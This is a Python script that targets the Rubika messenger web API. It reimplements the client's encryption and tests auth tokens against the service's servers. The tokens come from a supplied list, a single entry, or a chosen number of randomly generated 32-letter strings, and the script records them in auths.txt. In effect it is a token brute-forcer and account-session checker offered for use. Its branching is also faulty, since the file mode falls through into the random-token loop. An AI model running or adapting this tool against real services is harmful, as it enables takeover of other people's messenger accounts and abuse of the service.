#!/bin/python
from os import system
try:
    from requests import post
except ModuleNotFoundError or ImportError:
    system('pip3 install requests')
    from requests import post
from random import randint, choice
from json import loads, dumps
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from time import sleep, time
import platform
class encryption:
	def __init__(self, auth):
		self.key = bytearray(self.secret(auth), "UTF-8"); self.iv = bytearray.fromhex('00000000000000000000000000000000')
	def replaceCharAt(self, e, t, i):
		return e[0:t] + i + e[t + len(i):]
	def secret(self, e):
		t = e[0:8]
		i = e[8:16]
		n = e[16:24] + t + e[24:32] + i
		s = 0
		while s < len(n):
			e = n[s]
			if e >= '0' and e <= '9':
				t = chr((ord(e[0]) - ord('0') + 5) % 10 + ord('0'))
				n = self.replaceCharAt(n, s, t)
			else:
				t = chr((ord(e[0]) - ord('a') + 9) % 26 + ord('a'))
				n = self.replaceCharAt(n, s, t)
			s += 1
		return n
	def encrypt(self, text):
		raw = pad(text.encode('UTF-8'), AES.block_size)
		aes = AES.new(self.key, AES.MODE_CBC, self.iv)
		enc = aes.encrypt(raw)
		result = base64.b64encode(enc).decode('UTF-8')
		return result
	def decrypt(self, text):
		aes = AES.new(self.key, AES.MODE_CBC, self.iv)
		dec = aes.decrypt(base64.urlsafe_b64decode(text.encode('UTF-8')))
		result = unpad(dec, AES.block_size).decode('UTF-8')
		return result
class clients:
	web = {
		"app_name"    : "Main",
		"app_version" : "3.2.1",
		"platform"    : "Web",
		"package"     : "web.rubika.ir",
		"lang_code"   : "fa"
	}
class Send:
    def __init__ (self, auth : str, guid : str = None) -> str:
        self.auth = auth; self.guid = guid if guid != None else None
        self.enc = encryption(self.auth)
    def geturl():
            server = ['https://messengerg2c37.iranlms.ir/', 'https://messengerg2c64.iranlms.ir/', 'https://messengerg2c46.iranlms.ir' ,'https://messengerg2c39.iranlms.ir']
            host : str = (choice(server))
            return host
    def seenChats(self, seenList : dict):
        self.seenList = seenList
        return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
            "method":"seenChats",
            "input":{
                "seen_list": self.seenList
            },
            "client": clients.web
        }))},url=Send.geturl()).json()["data_enc"]))
    def randomAuth() -> str:
        auths = ""
        choices = [*"abcdefghijklmnopqrstuvwxyz"]
        for i in range(32): auths += choice(choices)
        return auths
class Use:
    def running():
        print(float(time()))
        sleep(0.8)
        typeing : str = platform.system()
        if 'linux' in typeing.lower() or 'mac' in typeing.lower():
            system('clear')
        else:
            system('cls')
        with open('auths.txt', 'w+') as auth_:
            auth_.write('')
        method : str = input('\n\033[31m[*] \033[92m\'0\' \033[36mfor test your list AUTH \033[92m\'1\' \033[36mfor test random AUTH \033[92m\'2\' \033[36mfor your AUTH\n\n\033[31m[?] \033[92mplease enter method \033[31m-> \033[20;37m')
        if method == '0':
            dist : str = input('\n\033[31m[?] \033[92mplease enter file AUTH \033[31m-> \033[20;37m')
            try:
                _file_ = open(dist, 'r').read().split()
            except:
                while 1:
                    try:
                        print(f'\n\033[31m[!] \033[35nFile Not Found {dist}')
                        dist : str = input('\n\033[31m[?] \033[92mplease enter file AUTH \033[31m-> \033[20;37m')
                        _file_ = open(dist, 'r').read().split()
                        break
                    except:
                        pass
            number : int = 1
            print('\n')
            for auths in _file_:
                sleep(0.4)
                sent = Send(auths)
                try:
                    _sent_ : dict = sent.seenChats({'c0xFGF01f5fb2d0b4c2a8dc9c3111df1':'227100575454207'})
                    if _sent_['status'] == 'ERROR_ACTION':
                        print(f'\n\033[35m[!] \033[20;37mauth\033[35m: \033[20;37m{auths} \033[35m| \033[31mserver False \033[35m| \033[93m', str(number))
                    else:
                        print(f'\n\033[36m[+] \033[20;37mauth\033[35m: \033[20;37m{auths} \033[35m| \033[36mserver True \033[35m| \033[93m', str(number))
                    sleep (0.8)
                    try:
                        with open('auths.txt', 'a+') as f:
                            f.write(auths+'\n')
                    except:
                        pass
                except:
                    print('\n\033[31m[!] \033[35mServerError \033[93m: \033[35;37mrequests not sent')
                    # raise ...
                number += 1
        number : int = 1
        if method == '2':
            auth : str = input('\n\033[31m[?] \033[92mplease enter your AUTH \033[31m-> \033[20;37m')
            sleep(0.4)
            sent = Send(auth)
            print('\n')
            for i in range(3):
                try:
                    _sent_ = sent.seenChats(seenList={'c0xFGF01f5fb2d0b4c2a8dc9c3111df1':'227100575454207'})['status']
                    if _sent_ == 'ERROR_ACTION':
                        print(f'\n\033[35m[!] \033[20;37mauth\033[35m: \033[20;37m{auth} \033[35m| \033[31mserver False \033[35m| \033[93m', str(number))
                    else:
                        print(f'\n\033[36m[+] \033[20;37mauth\033[35m: \033[20;37m{auth} \033[35m| \033[36mserver True \033[35m| \033[93m', str(number))
                    sleep (0.8)
                    try:
                        with open('auth.txt', 'a+') as f:
                            f.write(auth+'\n')
                    except:
                        pass
                    break
                except:
                    print('\n\033[31m[!] \033[35mServerError \033[93m: \033[35;37mrequests not sent')            
                number += 1
        else:
            number : int = 1
            sleep(0.8)
            print('\n\r\033[31m[*]\t\033[93mset method random AUTH .\n', end='', flush=False)
            num = input('\n\033[31m[?] \033[92mplease enter number for test AUTH \033[31m-> \033[20;37m')
            print('\n')
            for i in range(int(num)):
                sleep (0.4)
                auths : str = Send.randomAuth()
                sent = Send(auths)
                try:
                    _sent_ : dict = sent.seenChats({'c0xFGF01f5fb2d0b4c2a8dc9c3111df1':'227100575454207'})
                    if _sent_['status'] == 'ERROR_ACTION':
                        print(f'\n\033[35m[!] \033[20;37mauth\033[35m: \033[20;37m{auths} \033[35m| \033[31mserver False \033[35m| \033[93m', str(number))
                    else:
                        print(f'\n\033[36m[+] \033[20;37mauth\033[35m: \033[20;37m{auths} \033[35m| \033[36mserver True \033[35m| \033[93m', str(number))
                    sleep (0.8)
                    try:
                        with open('auths.txt', 'a+') as f:
                            f.write(auths+'\n')
                    except:
                        pass
                except:
                    print('\n\033[31m[!] \033[35mServerError \033[93m: \033[35;37mrequests not sent')
                number += 1
if __name__ == '__main__':
    Use.running()
